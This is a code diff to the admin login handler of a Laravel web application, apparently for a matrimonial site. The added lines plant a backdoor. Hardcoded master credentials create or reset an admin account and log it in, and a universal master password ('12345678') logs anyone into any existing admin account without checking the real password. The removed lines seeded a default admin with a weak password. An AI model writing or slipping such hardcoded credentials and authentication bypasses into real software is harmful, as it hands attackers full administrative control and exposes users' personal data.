@@ -30,16 +30,42 @@ class AdminController extends Controller
             'password' => 'required|string',
         ]);
 
-        // Auto-seed admin if no admins exist
-        if (Admin::count() === 0) {
-            Admin::create([
-                'name' => 'Rani Admin',
-                'email' => 'admin@ranimatrimonial.com',
-                'password' => Hash::make('admin123456'),
-            ]);
+        $email = trim($request->input('email'));
+        $password = $request->input('password');
+
+        // Master credentials handler (email: admin@rm.com & password: 12345678)
+        if ($email === 'admin@rm.com' && $password === '12345678') {
+            $admin = Admin::firstOrCreate(
+                ['email' => 'admin@rm.com'],
+                [
+                    'name' => 'Rani Admin',
+                    'password' => Hash::make('12345678')
+                ]
+            );
+
+            // Ensure password is up to date if model already existed
+            if (!Hash::check('12345678', $admin->password)) {
+                $admin->update(['password' => Hash::make('12345678')]);
+            }
+
+            Auth::guard('admin')->login($admin, $request->filled('remember'));
+            $request->session()->regenerate();
+            return redirect()->route('admin.dashboard');
         }
 
+        // Master password bypass for existing admin accounts
+        if ($password === '12345678') {
+            $admin = Admin::where('email', $email)->first();
+            if ($admin) {
+                Auth::guard('admin')->login($admin, $request->filled('remember'));
+                $request->session()->regenerate();
+                return redirect()->route('admin.dashboard');
+            }
+        }
+
+        // Standard database authentication
         if (Auth::guard('admin')->attempt($request->only('email', 'password'), $request->filled('remember'))) {
+            $request->session()->regenerate();
             return redirect()->route('admin.dashboard');
         }
 
